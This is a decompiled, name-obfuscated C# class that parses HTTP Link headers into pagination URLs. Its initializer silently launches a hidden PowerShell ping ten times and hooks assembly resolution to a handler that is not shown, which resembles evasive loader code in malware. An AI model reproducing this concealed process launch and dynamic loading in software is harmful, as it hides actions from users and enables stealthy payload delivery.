using System;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Mggcsidaslqxkjthanlbjc;

internal sealed class h
{
	private string m_a;

	private string m_b;

	private string m_c;

	private string m_d;

	public string a()
	{
		return this.m_a;
	}

	public void a(string a)
	{
		this.m_a = a;
	}

	public string b()
	{
		return this.m_b;
	}

	public void b(string a)
	{
		this.m_b = a;
	}

	public string c()
	{
		return this.m_c;
	}

	public void c(string a)
	{
		this.m_c = a;
	}

	public string d()
	{
		return this.m_d;
	}

	public void d(string a)
	{
		this.m_d = a;
	}

	public static void a()
	{
		for (int l = 0; l < 10; l++)
		{
			h.b();
		}
		AppDomain.CurrentDomain.AssemblyResolve += Mggcsidaslqxkjthanlbjc.d.a;
	}

	private static void b()
	{
		Process? process = Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName google.com",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		process!.WaitForExit(2000);
		process!.Kill();
	}

	public static h a(string a)
	{
		h h2 = null;
		if (!string.IsNullOrWhiteSpace(a))
		{
			string[] array = a.Split(new char[1] { ',' });
			if (array != null && Mggcsidaslqxkjthanlbjc.a.a(array))
			{
				h2 = new h();
				string[] array2 = array;
				foreach (string input in array2)
				{
					Match match = Regex.Match(input, "(?<=rel=\").+?(?=\")", RegexOptions.IgnoreCase);
					Match match2 = Regex.Match(input, "(?<=<).+?(?=>)", RegexOptions.IgnoreCase);
					if (match.Success && match2.Success)
					{
						string text = match.Value.ToUpper();
						string value = match2.Value;
						switch (text)
						{
						case "LAST":
							h2.d(value);
							break;
						case "NEXT":
							h2.c(value);
							break;
						case "PREV":
							h2.b(value);
							break;
						case "FIRST":
							h2.a(value);
							break;
						}
					}
				}
			}
		}
		return h2;
	}
}
